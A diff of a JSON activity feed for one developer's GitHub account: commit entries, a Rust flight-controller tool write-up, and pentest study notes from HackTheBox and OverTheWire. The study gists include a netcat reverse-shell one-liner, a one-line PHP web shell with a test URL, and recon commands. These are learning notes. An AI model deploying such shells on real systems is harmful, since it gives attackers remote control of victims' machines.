@@ -1,6 +1,221 @@
 [
   {
+    "key": 0,
+    "html_link": "https://gist.github.com/trmchale1/9b1f7f162b7c3adbf86a542ff97f5f74",
+    "timestamp": "2026-05-09T22:12:16Z",
+    "description": "",
+    "content": "I created a repo https://github.com/trmchale1/fcb_cli, for Hummingbird Flight Controller Tools.\n\nThe repo includes a dashboard for the flight controller and a CLI for Betaflight / AT32 boards, both in Rust.\n\n## cargo run --bin dashboard\n\n```\n\ud83d\ude81 HUMMINGBIRD AIO255 STATUS DASHBOARD\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nBoard     : HUMMINGBIRD_AIO255_AT32F435\nFirmware  : Betaflight 4.5.3\n\nMCU Temp  :   53.0\u00b0C\nVoltage   :  2.79 V\nCPU Load  :  22.0%\nUptime    : 7879 seconds\nI2C Errors: 9\n\nStatus    : \u26a0\ufe0f  Check I2C\n```\n\n## cargo run --bin fcb_cli\nPress Enter several times, type commands when you reach the # character\n```\n# status\nMCU AT32F435 Clock=288MHz, Vref=3.27V, Core temp=52degC\nStack size: 2048, Stack address: 0x2002fff0\nConfiguration: CONFIGURED, size: 4104, max available: 16384\nDevices detected: SPI:1, I2C:0\nGyros detected: gyro 1 locked dma\nGYRO=ICM42688P, ACC=ICM42688P\nOSD: MSP (53 x 20)\nSystem Uptime: 7941 seconds\nCPU:22%, cycle time: 125, GYRO rate: 8000, RX rate: 15, System rate: 9\nVoltage: 278 * 0.01V (0S battery - NOT PRESENT)\nI2C Errors: 9\nFLASH: JEDEC ID=0x00efaa21 128M\nGPS: NOT ENABLED\nArming disable flags: RXLOSS ANGLE CLI\n\n# version\n# Betaflight / AT32F435G (A435) 4.5.3 May 28 2025 / 13:06:58 (57c3471dc) MSP API: 1.46\n# board: manufacturer_id: HUMMINGBIRD, board_name: HUMMINGBIRD_AIO255_AT32F435\n\n# get gyro_hardware\ngyro_hardware_lpf = NORMAL\nAllowed values: NORMAL, OPTION_1, OPTION_2, EXPERIMENTAL\n\n# diff\n\n# version\n# Betaflight / AT32F435G (A435) 4.5.3 May 28 2025 / 13:06:58 (57c3471dc) MSP API: 1.46\n\n# start the command batch\nbatch start\n\nboard_name HUMMINGBIRD_AIO255_AT32F435\nmanufacturer_id HUMMINGBIRD\n\n# feature\nfeature SERVO_TILT\nfeature RANGEFINDER\nfeature TELEMETRY\nfeature LED_STRIP\nfeature DISPLAY\nfeature OSD\nfeature CHANNEL_FORWARDING\n\nprofile 0\n\nrateprofile 0\n\n# end the command batch\nbatch end\n```\n"
+  },
+  {
     "key": 14,
+    "html_link": "https://github.com/trmchale1/hacking/commit/bc83220abf066e65bef231192b6748c1378363f2",
+    "branch": "main",
+    "timestamp": "2024-12-09T20:10:25Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 15,
+    "html_link": "https://github.com/trmchale1/hacking/commit/96dc0cb6e207bfd0660505dd12cee498a6d4c023",
+    "branch": "main",
+    "timestamp": "2024-11-17T22:37:43Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 16,
+    "html_link": "https://github.com/trmchale1/hacking/commit/88594a9cc3787a5e37fee98686deca1f585d1067",
+    "branch": "main",
+    "timestamp": "2024-10-29T02:59:47Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 17,
+    "html_link": "https://github.com/trmchale1/hacking/commit/4abb74ae773fa6d2424f3634e4cccdf3568554fa",
+    "branch": "main",
+    "timestamp": "2024-10-28T03:23:16Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 18,
+    "html_link": "https://github.com/trmchale1/hacking/commit/6c8bda924789ed1527b7c316eae76a15c4d3029e",
+    "branch": "main",
+    "timestamp": "2024-10-27T16:43:40Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 19,
+    "html_link": "https://github.com/trmchale1/hacking/commit/ff6d561f643bce6ab8837ceacfba6d9636b485b7",
+    "branch": "main",
+    "timestamp": "2024-10-26T23:08:25Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 20,
+    "html_link": "https://github.com/trmchale1/hacking/commit/caef96b5ec71ad103f82d04f4ad76aa05c5544fd",
+    "branch": "main",
+    "timestamp": "2024-10-26T14:41:30Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 21,
+    "html_link": "https://github.com/trmchale1/hacking/commit/7962997a263d1de3eb760847bc093cc004e8ba69",
+    "branch": "main",
+    "timestamp": "2024-10-26T14:40:59Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 22,
+    "html_link": "https://github.com/trmchale1/hacking/commit/fe488d700a0fe88ab2067a43a22c2ad9bb03fcfd",
+    "branch": "main",
+    "timestamp": "2024-10-24T18:19:48Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 23,
+    "html_link": "https://github.com/trmchale1/hacking/commit/d58743686469beaebe768ab1171bbccfaf2e89f2",
+    "branch": "main",
+    "timestamp": "2024-10-24T03:38:13Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 24,
+    "html_link": "https://github.com/trmchale1/hacking/commit/e97cbbc5825aeb70efed0f82d3d79277d767b900",
+    "branch": "main",
+    "timestamp": "2024-10-22T19:25:06Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 25,
+    "html_link": "https://github.com/trmchale1/hacking/commit/c56ff02ebade240e7b6f2206648a83f24494b60c",
+    "branch": "main",
+    "timestamp": "2024-10-22T19:23:04Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 26,
+    "html_link": "https://github.com/trmchale1/hacking/commit/445e86088afaecb1ee8a64894335d698da91827a",
+    "branch": "main",
+    "timestamp": "2024-10-22T19:22:39Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 27,
+    "html_link": "https://github.com/trmchale1/hacking/commit/b682665b7818a3120f1025062f0fbda46bca45d3",
+    "branch": "main",
+    "timestamp": "2024-10-22T01:41:16Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 28,
+    "html_link": "https://github.com/trmchale1/hacking/commit/f537fde1d30a3ce55b5dfa73592c6e281a6e3340",
+    "branch": "main",
+    "timestamp": "2024-10-20T18:20:21Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 29,
+    "html_link": "https://github.com/trmchale1/hacking/commit/3e96e17eb9d0bc49ce05c04e73ca9db750bc8848",
+    "branch": "main",
+    "timestamp": "2024-10-19T22:31:45Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 30,
+    "html_link": "https://github.com/trmchale1/hacking/commit/e45b392b56461c6e2dff6997dbc33e7369c6f8f6",
+    "branch": "main",
+    "timestamp": "2024-10-18T18:28:33Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 31,
+    "html_link": "https://github.com/trmchale1/hacking/commit/fcb9d5144a5bac42395efb57d4431ed853cf2405",
+    "branch": "main",
+    "timestamp": "2024-10-17T17:14:28Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 32,
+    "html_link": "https://github.com/trmchale1/hacking/commit/6a42cdf79b4e951cb70051e15d46c29400399b44",
+    "branch": "main",
+    "timestamp": "2024-10-17T00:43:22Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 33,
+    "html_link": "https://github.com/trmchale1/hacking/commit/81d4b728a65125d2cfb7d536b7292164583cd70b",
+    "branch": "main",
+    "timestamp": "2024-10-17T00:42:50Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 34,
+    "html_link": "https://github.com/trmchale1/hacking/commit/e61dc20529015b9deaeacd19cd71a610ecdc1945",
+    "branch": "main",
+    "timestamp": "2024-10-16T01:16:56Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 35,
+    "html_link": "https://github.com/trmchale1/hacking/commit/188ad4f1289b5b4bbef2533821960d7d3f2e9a0e",
+    "branch": "main",
+    "timestamp": "2024-10-16T00:00:25Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 36,
+    "html_link": "https://github.com/trmchale1/hacking/commit/fb8679080b30670c4cb9fc8602241ba6b141bada",
+    "branch": "main",
+    "timestamp": "2024-10-15T23:52:31Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 37,
+    "html_link": "https://github.com/trmchale1/hacking/commit/16381ec6654de9837859a4c85bbcc8caafd654c4",
+    "branch": "main",
+    "timestamp": "2024-10-14T23:54:49Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 38,
+    "html_link": "https://github.com/trmchale1/hacking/commit/c0b89bbcdb4c3736c6385fe88e1732d010565a88",
+    "branch": "main",
+    "timestamp": "2024-10-14T00:08:27Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 39,
+    "html_link": "https://github.com/trmchale1/hacking/commit/0cebb6abe3e636af4db651d3ef98bc72d67c3c69",
+    "branch": "main",
+    "timestamp": "2024-10-13T21:49:44Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 40,
     "html_link": "https://github.com/trmchale1/hacking/commit/3f4e0fdea8cc97f8f4704d32836925cb1a554a7c",
     "branch": "main",
     "timestamp": "2024-10-13T17:41:54Z",
@@ -8,7 +223,7 @@
     "repo": "hacking"
   },
   {
-    "key": 15,
+    "key": 41,
     "html_link": "https://github.com/trmchale1/hacking/commit/35802038808d4c52dcaf71d1ab361ab6dfb0501f",
     "branch": "main",
     "timestamp": "2024-10-13T04:04:30Z",
@@ -16,7 +231,7 @@
     "repo": "hacking"
   },
   {
-    "key": 16,
+    "key": 42,
     "html_link": "https://github.com/trmchale1/hacking/commit/5cdd42cb894c17bf081da19faecb321643812908",
     "branch": "main",
     "timestamp": "2024-10-12T15:47:42Z",
@@ -24,7 +239,7 @@
     "repo": "hacking"
   },
   {
-    "key": 17,
+    "key": 43,
     "html_link": "https://github.com/trmchale1/hacking/commit/5434038a68ca3507b4f9d45a87cf52ff600ccb03",
     "branch": "main",
     "timestamp": "2024-10-11T15:23:25Z",
@@ -32,250 +247,42 @@
     "repo": "hacking"
   },
   {
-    "key": 18,
-    "html_link": "https://github.com/trmchale1/hacking/commit/43a22e350bd93aacdd8615de1e76376b4194f059",
-    "branch": "main",
-    "timestamp": "2024-10-10T15:03:47Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 19,
-    "html_link": "https://github.com/trmchale1/hacking/commit/a9772a497b025f68b1722b830c6f031a13e39c30",
-    "branch": "main",
-    "timestamp": "2024-10-09T23:02:12Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 20,
-    "html_link": "https://github.com/trmchale1/hacking/commit/03e1a25dcaa4bded18f7764af4568353924e7f8b",
-    "branch": "main",
-    "timestamp": "2024-10-08T03:49:36Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 21,
-    "html_link": "https://github.com/trmchale1/hacking/commit/7737c808db32aeb7527a5c4f9e56a022063dc1d9",
-    "branch": "main",
-    "timestamp": "2024-10-08T01:38:07Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 22,
-    "html_link": "https://github.com/trmchale1/hacking/commit/15760d9744fc45260660137dbe1afbec9cda0a2c",
-    "branch": "main",
-    "timestamp": "2024-10-07T02:58:30Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 23,
-    "html_link": "https://github.com/trmchale1/hacking/commit/5de2a2e48ff5e8e5555870870bb7d79826c3a812",
-    "branch": "main",
-    "timestamp": "2024-10-06T17:23:45Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 24,
-    "html_link": "https://github.com/trmchale1/hacking/commit/c67b183bd96d3f08ee24e56bd56a6670e807bacd",
-    "branch": "main",
-    "timestamp": "2024-10-06T16:36:23Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 25,
-    "html_link": "https://github.com/trmchale1/hacking/commit/c2ca8a4f1292ae17c06620a651fbfaf0df1eb808",
-    "branch": "main",
-    "timestamp": "2024-10-05T01:50:37Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 26,
-    "html_link": "https://github.com/trmchale1/hacking/commit/78d8db861b36c857eff67597f1221b20e0cf1984",
-    "branch": "main",
-    "timestamp": "2024-10-03T16:44:48Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 0,
+    "key": 1,
     "html_link": "https://gist.github.com/trmchale1/3d298beca1c7c42f1177a6eca06deeb7",
     "timestamp": "2024-10-01T17:34:38Z",
     "description": "",
     "content": "I disliked some of my notes yesterday regarding reverse shells on a target machine. \n\n\nI hope these notes are more clear, as getting a shell on an attacking box is a critical skill.\n\n\nOn the target machine we can run a bash command like:\n```\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {attacking port} > /tmp/f\n```\n\n\nAnd on our host machine we can listen for the pipe, (the ip address and port number will the same)\n\n```\nnc -nv {ip attacking box} {some port}\n```"
   },
   {
-    "key": 27,
-    "html_link": "https://github.com/trmchale1/hacking/commit/2fdfbc8e5425434e15a514204f3bc831da349f61",
-    "branch": "main",
-    "timestamp": "2024-10-01T01:47:19Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 1,
+    "key": 2,
     "html_link": "https://gist.github.com/trmchale1/fdb16241b570be78d59947d69621f501",
     "timestamp": "2024-10-01T01:43:50Z",
     "description": "",
     "content": "I was able to finish hackthebox's Academy, which is 28 modules and about 2 months worth of videos, trainings, and questions in real life hacking scenarios.\n\n\nSome of the commands I found myself using were:\n\n\nAdding to the hosts file. The /etc/hosts file is used to resolve a hostname into an ip address.\n```\necho \"{target_ip} ignition.htb\" | sudo tee -a /etc/hosts\n```\n\n\nNmap, this command with the flag --min-rate specifies the number of packets that nmap should send per second,\nthe higher the number the faster the scan.\n```\nnmap -p- --min-rate=1000 -sV {target_ip}\n```\n\n\nNmap with script scanning and version detection, one of the more intrusive nmap scans, with a high probability of\nbeing caught. It produces attractive and verbose output. Use as a first scan if unconcerned with detection.\n```\nsudo nmap -sC -sV {target_ip}\n```\n\n\nGobuster brute-force web-app directory structure\n```\nsudo gobuster dir -w /usr/share/wordlists/common.txt -u {target ip}\n```\n\n\nA wordlist for gobuster brute force attacks:\n```\ngit clone https://github.com/danielmiessler/SecLists.git\n```\n\n\nRDP into a windows host:\n```\nxfreerdp /v:{target ip} /u:Administrator\n```\n\n\nList SMB shares\n```\nsmbclient -L {target ip}\n```\n\n\nLogin to SMB share:\n```\nsmbclient \\\\\\\\{target ip}\\\\share\n```\n\n\nPHP, if we can upload the following php file to a web-app\n```\n<?php system($_GET[\"cmd\"]); ?>\n```\nAnd if the web-app responds with the output of the OS command `id`,\n```\nhttp://{ip address or dns name}/shell.php?cmd=id\n```\n\n\nThen we know we can upload a reverse shell via the web-app.\n"
   },
   {
-    "key": 28,
-    "html_link": "https://github.com/trmchale1/hacking/commit/27e5c4b44052edcc3f85d9eb0ea5dae75c5d16a6",
-    "branch": "main",
-    "timestamp": "2024-09-25T23:08:05Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 2,
+    "key": 3,
     "html_link": "https://gist.github.com/trmchale1/2e7adacea695b96f17ae19e4a6bfab42",
     "timestamp": "2024-09-19T23:35:23Z",
     "description": "",
     "content": "Today I pushed some notes from my work on https://academy.hackthebox.com/. I've been diving deeper into cybersecurity and\nfound their educational material to be excellent. My goal is to get certified on their CPTS, certified pentesting specialist exam, which I am preparing for now. I'm going to use Hack The Box's educational material to sharpen my skills and take a shot at Offensive Security's OSCP certification, which seems to be the standard in the industry for early professionals in cybersecurity.\n\n\nA few tools I find myself using:\n\n\n```nmap -sV [ip address]```\n\n\nI use nmap for port sniffing, and reconnaissance to surveil a target. Nmap has a large number of flags and options, but the -sV flag gets the service and version running on open ports.\n\n\nThe metasploit framework offers a command line interface (as well as GUI) that has a library of vulnerabilites to attack a target.\n\n\nIf we get the right information from our recon, and there is a vulnerability on that version of machine or service, we can attack it directly.\n\n\nGobuster is a command line tool used for brute forcing directories, subdomains, and vhosts. It uses a wordlist to attempt to find the directory structure of a web app.\n\n\nHydra is a command line tool we can use to brute force ssh."
   },
   {
-    "key": 29,
-    "html_link": "https://github.com/trmchale1/hacking/commit/1e3d4881c71f1a7ec7e9c2fad8c3427c5c9549a7",
-    "branch": "main",
-    "timestamp": "2024-09-19T23:08:10Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 30,
-    "html_link": "https://github.com/trmchale1/hacking/commit/eaf8b6eb6395b02447d8fb1385517146fe33008b",
-    "branch": "main",
-    "timestamp": "2024-09-13T12:27:35Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 31,
-    "html_link": "https://github.com/trmchale1/hacking/commit/d8767d9993cef1fc12edfc271a0e5b93fdaf12cf",
-    "branch": "main",
-    "timestamp": "2024-09-13T11:48:18Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 32,
-    "html_link": "https://github.com/trmchale1/hacking/commit/1398215a60047869067e02708500abc4c958031b",
-    "branch": "main",
-    "timestamp": "2024-09-13T11:18:58Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 33,
-    "html_link": "https://github.com/trmchale1/hacking/commit/e297eeae004dc06772513d74f06b7067035b5428",
-    "branch": "main",
-    "timestamp": "2024-09-02T16:11:31Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 34,
-    "html_link": "https://github.com/trmchale1/hacking/commit/da68e0ae391f4271be86dd46ad75eda310311776",
-    "branch": "main",
-    "timestamp": "2024-09-02T15:54:39Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 35,
-    "html_link": "https://github.com/trmchale1/hacking/commit/98ffb4c4cacd711bfee01a4ccab4769e9a6ee027",
-    "branch": "main",
-    "timestamp": "2024-09-01T20:31:04Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 36,
-    "html_link": "https://github.com/trmchale1/hacking/commit/002c1bbd46f352d29dc96afe98cf08ce9cc1e370",
-    "branch": "main",
-    "timestamp": "2024-09-01T20:05:31Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 37,
-    "html_link": "https://github.com/trmchale1/hacking/commit/138f64907e719eb4d4090e7afb080a57075cb8b0",
-    "branch": "main",
-    "timestamp": "2024-09-01T19:40:20Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 38,
-    "html_link": "https://github.com/trmchale1/hacking/commit/6e8371006f313b46cf11dbf9b54f2f9eeea6e444",
-    "branch": "main",
-    "timestamp": "2024-09-01T19:11:27Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 39,
-    "html_link": "https://github.com/trmchale1/hacking/commit/520834648a573bce9e13d2533eaf0ff6cc51c192",
-    "branch": "main",
-    "timestamp": "2024-09-01T17:22:24Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 40,
-    "html_link": "https://github.com/trmchale1/hacking/commit/be32aafb3a8b4cfcf0178ddccb030c08eafe8cd8",
-    "branch": "main",
-    "timestamp": "2024-09-01T17:08:41Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 3,
+    "key": 4,
     "html_link": "https://gist.github.com/trmchale1/e6338482dd2052176909a82c09a4732b",
     "timestamp": "2024-09-01T00:41:51Z",
     "description": "OverTheWire - Pentesting Notes",
     "content": "Shook the rust off of Visual Studio Code and was surprised to find a well documented directory w/ Dockerfile and docker-compose file running kali linux with a dozen or so shell scripts for a wargame called ```Bandit```.\n\n\nThe wargame is from a webapp called OverTheWire which offers free wargames to practice pentesting skills, link here -> https://overthewire.org/wargames/bandit/\n\n\nEach level of the Bandit wargame has you break into a linux virtual machine, the previous level's task guides you to a password, which you need to login to the next level's virtual machine.\n\n\nThis summer I took some classes in Calculus and Physics and this was a good way stretching out my command line and scripting skills for upcoming interviews.\n\n\nA summary of some of the commands I used:\n\n\n- sshpass - automates the process of ssh into a VM, allows you to run commands upon logging in\n- grep - searches plaintext\n- find - directory search, using syntax, filesize, expressive options\n- 2>/dev/null - when you want to throw away garbage\n- cut - extracts text from each line of a file\n- sort - sorts lines from a textfile\n- uniq - fed lines from standard input or a file, outputs only unique text\n- strings - extract strings from a binary file\n- base64 - and encoder and decoder, to help transmit data over a network w/o running into errors\n- tr - traslates or deletes characters, useful if you want implement ROT13 or the Caesar cipher\n- mktemp - creates temporary folder/file\n- xxd - hexdump or the reverse\n- gzip - compression tool, header is \\x1F\\x8B\\x08\n- bzip2 - compression tool, header is 425a, the next byte gives the version\n- tar - compress to/from archive\n- scp - copy files \n\n\n\nThe code can be found here -> https://github.com/trmchale1/hacking"
   },
   {
-    "key": 41,
-    "html_link": "https://github.com/trmchale1/hacking/commit/31f946d1a9b943fac27779bd1bf39858baa9c93b",
-    "branch": "main",
-    "timestamp": "2024-08-31T23:18:48Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 42,
-    "html_link": "https://github.com/trmchale1/hacking/commit/ec949599c9737caa2f5e202df19a4437eb701004",
-    "branch": "main",
-    "timestamp": "2024-08-31T22:58:31Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 43,
-    "html_link": "https://github.com/trmchale1/hacking/commit/2b2dfe96cb3169c4ed358c453b924e9aecb759ce",
-    "branch": "main",
-    "timestamp": "2024-08-31T20:07:11Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 4,
+    "key": 5,
     "html_link": "https://gist.github.com/trmchale1/e19daf647046dcb9d50134ee270812c7",
     "timestamp": "2024-03-24T21:46:28Z",
     "description": "git reset --hard",
     "content": "Today I ran a command I would use rarely, and if it were in a workplace environment, would actually be a pretty big deal.\n\n\n``` git reset --hard 6894f6e1...```\n\n\nLike an artist, you have to look at your work and realize that some of it is utter junk and needs to be thrown out. Bad code smells. \n\n\nIt smells like 1000+ lines of code changes, with changes to configs that indicate potential dependency conflicts.\n\n\nIn this case I wanted to integrate RainbowKit to my personal website timmchale.co, the css in this new download clashed with my current css and postprocessing.\n\n\nI spent several days debugging dependency issues and deleting core functionality of the Gatsby app that I started with.\n\n\nNow I am realizing I built my web-app with Gatsby, which was fine for a one page app with simple html like functionality, but I need to go with Next.js for improved routing functionality.\n\n\nKeeping code small, with simple workflows consistently works for me. Any time I put too much functionality together, things tend to break.\n\n\nI used ```git reset``` because I wanted to change where the HEAD was pointing at, this command alters previous history, going back in time, so to speak.\n\n\nI felt I needed to use reset because the branch I started the dev work in had already been merged with a long history into the main branch. And I wanted that history removed as well.\n\n\nIn most cases when correcting the mistake of just one commit, you want to use the ```git revert``` command, github's user interface has a good revert feature in the pull request tab."
   },
   {
-    "key": 8,
+    "key": 9,
     "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/6894f6e169d51a0e3e2ca28a3fb4fca90eacf3b9",
     "branch": "master",
     "timestamp": "2024-03-24T21:16:37Z",
@@ -283,7 +290,7 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 9,
+    "key": 10,
     "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/45b3c63adb54079e54508ce132728f191e6bb02a",
     "branch": "master",
     "timestamp": "2024-03-23T19:27:57Z",
@@ -291,7 +298,7 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 10,
+    "key": 11,
     "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/004826837276e0d705e823a68fc9ea27ac168388",
     "branch": "rainbowkit-manual-integration",
     "timestamp": "2024-03-21T18:01:03Z",
@@ -299,7 +306,7 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 11,
+    "key": 12,
     "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/490bb1b8c82e0504caea972f09ad5cf1756fe021",
     "branch": "master",
     "timestamp": "2024-03-18T15:57:32Z",
@@ -307,7 +314,7 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 12,
+    "key": 13,
     "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/254cf8ff0951a0f218535700de812e682a9f8212",
     "branch": "master",
     "timestamp": "2024-03-18T15:30:26Z",
@@ -315,29 +322,21 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 13,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/1f42142aec093a152cd0c106dc526b45cb891d66",
-    "branch": "merge-rainbow-kit-react-app",
-    "timestamp": "2024-03-18T15:21:43Z",
-    "activity_type": "branch_creation",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
-    "key": 5,
+    "key": 6,
     "html_link": "https://gist.github.com/trmchale1/e4c10dd319b83e2c043c7e729402de1a",
     "timestamp": "2024-03-04T01:17:44Z",
     "description": "timmchale.co is now live",
     "content": "This is a link to the first release of timmchale.co \n\n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\n\nThis is a link to my website \n\n\ntimchale.co"
   },
   {
-    "key": 6,
+    "key": 7,
     "html_link": "https://gist.github.com/trmchale1/4088356e12bd482146a1afadbe99c4e0",
     "timestamp": "2024-02-21T16:33:32Z",
     "description": "Smart Contract Audit Ethernaut: Fallout",
     "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n\n``` contract.Fal1out() ```"
   },
   {
-    "key": 7,
+    "key": 8,
     "html_link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
     "timestamp": "2024-02-20T01:27:08Z",
     "description": "Smart Contract Audit Ethernaut: Fallback",
